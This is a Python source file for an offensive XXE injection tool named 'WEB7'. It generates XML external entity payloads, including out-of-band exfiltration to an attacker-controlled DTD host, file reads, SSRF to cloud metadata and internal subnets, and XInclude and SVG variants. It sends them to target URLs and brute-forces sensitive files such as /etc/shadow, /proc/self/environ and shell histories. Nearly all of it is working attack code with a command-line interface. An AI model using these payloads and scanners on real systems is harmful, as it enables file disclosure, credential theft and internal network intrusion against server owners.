#!/usr/bin/env python3
"""WEB7 — XXE Injection Tool.

XXE payload generation, blind XXE detection, file read via SSRF,
and error-based exfiltration using only standard-library modules.
"""

import re
import sys
import urllib.request
import urllib.parse
import urllib.error
import xml.etree.ElementTree as ET
from typing import Optional


class XXEPayloadGenerator:
    """Generate classic and advanced XXE payloads."""

    ENTITY_TEMPLATE = '<!ENTITY {name} SYSTEM "{uri}">'

    @staticmethod
    def classic_file_read(file_path: str, param_entity: str = "xxe_file") -> str:
        payload = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE data [\n'
            f'  {XXEPayloadGenerator.ENTITY_TEMPLATE.format(name=param_entity, uri=file_path)}\n'
            ']>\n'
            f'<root>&{param_entity};</root>'
        )
        return payload

    @staticmethod
    def parameter_entity_file_read(file_path: str) -> str:
        payload = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE data [\n'
            '  <!ENTITY % file SYSTEM "file:///etc/passwd">\n'
            '  <!ENTITY % dtd SYSTEM "http://ATTACKER_SERVER/evil.dtd">\n'
            '  %dtd;\n'
            ']>\n'
            f'<root>&send;</root>'
        )
        return payload

    @staticmethod
    def ssrf_payload(internal_url: str) -> str:
        payload = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE data [\n'
            f'  {XXEPayloadGenerator.ENTITY_TEMPLATE.format(name="ssrf", uri=internal_url)}\n'
            ']>\n'
            '<root>&ssrf;</root>'
        )
        return payload

    @staticmethod
    def oob_exfil(file_path: str, callback_server: str) -> str:
        dtd = (
            '<!ENTITY % all "<!ENTITY send SYSTEM \'http://{server}/%file;\'>">'
        ).format(server=callback_server)
        payload = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE data [\n'
            f'  <!ENTITY % file SYSTEM "file://{file_path}">\n'
            f'  <!ENTITY % eval "{dtd}">\n'
            '  %eval;\n'
            '  %send;\n'
            ']>\n'
            '<root>exfil</root>'
        )
        return payload

    @staticmethod
    def error_based(file_path: str) -> str:
        payload = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE data [\n'
            f'  {XXEPayloadGenerator.ENTITY_TEMPLATE.format(name="err", uri=file_path)}\n'
            ']>\n'
            '<root>&err;</root>'
        )
        return payload

    @staticmethod
    def xinclude(file_path: str) -> str:
        payload = (
            f'<root xmlns:xi="http://www.w3.org/2001/XInclude">'
            f'<xi:include parse="text" uri="file://{file_path}"/>'
            f'</root>'
        )
        return payload

    @staticmethod
    def svg_xxe(file_path: str) -> str:
        payload = (
            '<?xml version="1.0" standalone="yes"?>\n'
            '<!DOCTYPE svg [\n'
            f'  {XXEPayloadGenerator.ENTITY_TEMPLATE.format(name="xxe", uri=file_path)}\n'
            ']>\n'
            '<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">\n'
            '  <text font-size="16" x="0" y="16">&xxe;</text>\n'
            '</svg>'
        )
        return payload


class BlindXXEDetector:
    """Detect blind XXE via error-based and OOB techniques."""

    DANGEROUS_PATTERNS = [
        r"entity\s+\w+\s+SYSTEM",
        r"ENTITY\s+\w+\s+SYSTEM",
        r"<!ENTITY",
        r"DOCTYPE\s+\w+\s*\[",
        r"SYSTEM\s+[\"']file://",
        r"SYSTEM\s+[\"']http://",
    ]

    ERROR_INDICATORS = [
        r"xml parsing error",
        r"xmlparser",
        r"sax.*exception",
        r"xml.*exception",
        r"lxml.*error",
        r"entity\s+reference",
        r"entity\s+not\s+defined",
        r"reference\s+to\s+entity",
        r"an\s+internal\s+entity",
        r"markup\s+declaration",
    ]

    def __init__(self, target_url: str, method: str = "POST",
                 param: str = "xml", headers: Optional[dict] = None):
        self.target_url = target_url
        self.method = method.upper()
        self.param = param
        self.headers = headers or {"Content-Type": "application/xml"}

    def _send(self, payload: str) -> tuple:
        """Send payload and return (status, body, headers)."""
        if self.method == "GET":
            url = f"{self.target_url}?{self.param}={urllib.parse.quote(payload)}"
            req = urllib.request.Request(url, method="GET")
        else:
            data = payload.encode("utf-8")
            req = urllib.request.Request(self.target_url, data=data, method="POST")

        for k, v in self.headers.items():
            req.add_header(k, v)

        try:
            resp = urllib.request.urlopen(req, timeout=10)
            body = resp.read().decode("utf-8", errors="replace")
            return resp.status, body, dict(resp.headers)
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace")
            return e.code, body, dict(e.headers)
        except Exception as e:
            return 0, str(e), {}

    def detect_xml_parsing(self) -> dict:
        """Test if server parses XML input."""
        benign = '<?xml version="1.0"?><root>test</root>'
        mal_entity = (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE test [\n'
            '  <!ENTITY testent "ENTITY_INJECTED">\n'
            ']>\n'
            '<root>&testent;</root>'
        )
        status_b, body_b, _ = self._send(benign)
        status_e, body_e, _ = self._send(mal_entity)

        result = {
            "parses_xml": False,
            "entity_expansion": False,
            "status_benign": status_b,
            "status_entity": status_e,
        }
        if "ENTITY_INJECTED" in body_e:
            result["entity_expansion"] = True
            result["parses_xml"] = True
        elif status_e == 200 and status_b == 200:
            result["parses_xml"] = True
        return result

    def test_file_read(self, file_path: str = "/etc/passwd") -> dict:
        """Try classic file read and check response."""
        payload = XXEPayloadGenerator.classic_file_read(file_path)
        status, body, _ = self._send(payload)
        linux_passwd = r"root:.*:0:0:"
        windows_hosts = r"\[hosts\]"
        result = {
            "status": status,
            "file_read_possible": False,
            "leaked_content": "",
        }
        if re.search(linux_passwd, body):
            result["file_read_possible"] = True
            match = re.search(r"root:.*", body)
            result["leaked_content"] = match.group(0) if match else "passwd pattern found"
        elif re.search(windows_hosts, body):
            result["file_read_possible"] = True
            result["leaked_content"] = "Windows hosts file pattern found"
        return result

    def error_based_exfil(self) -> dict:
        """Detect error-based XXE by triggering a parsing error with an invalid URI."""
        good = XXEPayloadGenerator.classic_file_read("/etc/hostname")
        bad = XXEPayloadGenerator.classic_file_read("file:///NONEXISTENT_XXE_PATH")
        _, body_good, _ = self._send(good)
        _, body_bad, _ = self._send(bad)

        error_found = False
        for pattern in self.ERROR_INDICATORS:
            if re.search(pattern, body_bad, re.IGNORECASE):
                error_found = True
                break
        return {
            "error_based_detected": error_found,
            "error_leaks_info": error_found and len(body_bad) > len(body_good),
        }

    def full_scan(self, file_path: str = "/etc/passwd") -> dict:
        """Run all detection methods."""
        results = {}
        results["xml_parsing"] = self.detect_xml_parsing()
        results["file_read"] = self.test_file_read(file_path)
        results["error_based"] = self.error_based_exfil()
        return results


class XXEExploiter:
    """Exploit known-XXE endpoints to read files or SSRF."""

    def __init__(self, target_url: str, method: str = "POST",
                 param: str = "xml", headers: Optional[dict] = None):
        self.target_url = target_url
        self.method = method.upper()
        self.param = param
        self.headers = headers or {"Content-Type": "application/xml"}

    def _send(self, payload: str) -> tuple:
        if self.method == "GET":
            url = f"{self.target_url}?{self.param}={urllib.parse.quote(payload)}"
            req = urllib.request.Request(url, method="GET")
        else:
            data = payload.encode("utf-8")
            req = urllib.request.Request(self.target_url, data=data, method="POST")

        for k, v in self.headers.items():
            req.add_header(k, v)

        try:
            resp = urllib.request.urlopen(req, timeout=10)
            body = resp.read().decode("utf-8", errors="replace")
            return resp.status, body, dict(resp.headers)
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace")
            return e.code, body, dict(e.headers)
        except Exception as e:
            return 0, str(e), {}

    def read_file(self, file_path: str) -> dict:
        """Read a file via XXE."""
        payload = XXEPayloadGenerator.classic_file_read(file_path)
        status, body, _ = self._send(payload)
        return {"status": status, "path": file_path, "content": body}

    def ssrf(self, internal_url: str) -> dict:
        """SSRF via XXE."""
        payload = XXEPayloadGenerator.ssrf_payload(internal_url)
        status, body, _ = self._send(payload)
        return {"status": status, "url": internal_url, "response": body}

    def xinclude_read(self, file_path: str) -> dict:
        """XInclude-based file read."""
        payload = XXEPayloadGenerator.xinclude(file_path)
        status, body, _ = self._send(payload)
        return {"status": status, "path": file_path, "content": body}

    def svg_upload_xxe(self, file_path: str) -> dict:
        """SVG upload XXE payload."""
        payload = XXEPayloadGenerator.svg_xxe(file_path)
        headers = dict(self.headers)
        headers["Content-Type"] = "image/svg+xml"
        req = urllib.request.Request(self.target_url, data=payload.encode("utf-8"),
                                    method="POST")
        for k, v in headers.items():
            req.add_header(k, v)
        try:
            resp = urllib.request.urlopen(req, timeout=10)
            body = resp.read().decode("utf-8", errors="replace")
            return {"status": resp.status, "path": file_path, "content": body}
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace")
            return {"status": e.code, "path": file_path, "content": body}
        except Exception as e:
            return {"status": 0, "path": file_path, "content": str(e)}

    def scan_common_files(self) -> list:
        """Read several common sensitive files."""
        paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hostname",
            "/etc/hosts",
            "/proc/self/environ",
            "/proc/version",
            "/proc/self/cmdline",
            "/var/log/auth.log",
        ]
        results = []
        for path in paths:
            r = self.read_file(path)
            r["interesting"] = bool(r["content"] and r["status"] == 200)
            results.append(r)
        return results


class XXEBruteForcer:
    """Brute-force common files and internal endpoints via XXE."""

    COMMON_FILES = [
        "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
        "/etc/issue", "/etc/motd", "/etc/crontab", "/etc/group",
        "/proc/version", "/proc/self/environ", "/proc/self/cmdline",
        "/proc/net/tcp", "/var/log/syslog", "/var/log/auth.log",
        "/root/.bash_history", "/home/user/.bash_history",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
    ]

    def __init__(self, target_url: str, method: str = "POST",
                 param: str = "xml", headers: Optional[dict] = None):
        self.detector = BlindXXEDetector(target_url, method, param, headers)
        self.exploiter = XXEExploiter(target_url, method, param, headers)

    def brute_files(self) -> list:
        results = []
        for path in self.COMMON_FILES:
            r = self.exploiter.read_file(path)
            r["interesting"] = bool(r["content"] and r["status"] == 200)
            results.append(r)
        return results

    def brute_internal(self, host_range: str = "192.168.1",
                       ports: list = None) -> list:
        if ports is None:
            ports = [80, 443, 8080, 8443, 3000, 5000, 9090]
        results = []
        for i in range(1, 255):
            for port in ports:
                url = f"http://{host_range}.{i}:{port}/"
                r = self.exploiter.ssrf(url)
                r["reachable"] = r["status"] != 0
                if r["reachable"]:
                    results.append(r)
        return results


def main():
    """CLI entry point for quick testing."""
    import argparse

    parser = argparse.ArgumentParser(
        description="WEB7 — XXE Injection Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 xxe_tool.py --mode generate --file /etc/passwd\n"
            "  python3 xxe_tool.py --mode detect --url http://target/xml\n"
            "  python3 xxe_tool.py --mode exploit --url http://target/xml "
            "--file /etc/passwd\n"
        ),
    )
    parser.add_argument("--mode", choices=["generate", "detect", "exploit", "brute"],
                        default="generate")
    parser.add_argument("--url", help="Target URL for detect/exploit/brute modes")
    parser.add_argument("--file", default="/etc/passwd", help="File path to read")
    parser.add_argument("--method", default="POST", help="HTTP method (GET/POST)")
    parser.add_argument("--param", default="xml", help="Parameter name")
    args = parser.parse_args()

    if args.mode == "generate":
        print("=== XXE Payload Generator ===\n")
        print("[Classic File Read]")
        print(XXEPayloadGenerator.classic_file_read(args.file))
        print("\n[Parameter Entity]")
        print(XXEPayloadGenerator.parameter_entity_file_read(args.file))
        print("\n[SSRF Payload]")
        print(XXEPayloadGenerator.ssrf_payload("http://169.254.169.254/latest/meta-data/"))
        print("\n[XInclude]")
        print(XXEPayloadGenerator.xinclude(args.file))
        print("\n[SVG XXE]")
        print(XXEPayloadGenerator.svg_xxe(args.file))
        print("\n[Error-Based]")
        print(XXEPayloadGenerator.error_based(args.file))

    elif args.mode == "detect":
        if not args.url:
            print("Error: --url required for detect mode")
            sys.exit(1)
        print(f"=== Blind XXE Detection: {args.url} ===\n")
        detector = BlindXXEDetector(args.url, args.method, args.param)
        results = detector.full_scan(args.file)
        for section, data in results.items():
            print(f"[{section}]")
            for k, v in data.items():
                print(f"  {k}: {v}")
            print()

    elif args.mode == "exploit":
        if not args.url:
            print("Error: --url required for exploit mode")
            sys.exit(1)
        print(f"=== XXE Exploitation: {args.url} ===\n")
        exploiter = XXEExploiter(args.url, args.method, args.param)
        result = exploiter.read_file(args.file)
        print(f"Status: {result['status']}")
        print(f"Path:   {result['path']}")
        print(f"Content:\n{result['content'][:2000]}")

    elif args.mode == "brute":
        if not args.url:
            print("Error: --url required for brute mode")
            sys.exit(1)
        print(f"=== XXE Brute Force: {args.url} ===\n")
        bf = XXEBruteForcer(args.url, args.method, args.param)
        results = bf.brute_files()
        for r in results:
            marker = "[+] HIT" if r["interesting"] else "[-] miss"
            print(f"  {marker}  {r['path']}  (status={r['status']})")


if __name__ == "__main__":
    main()
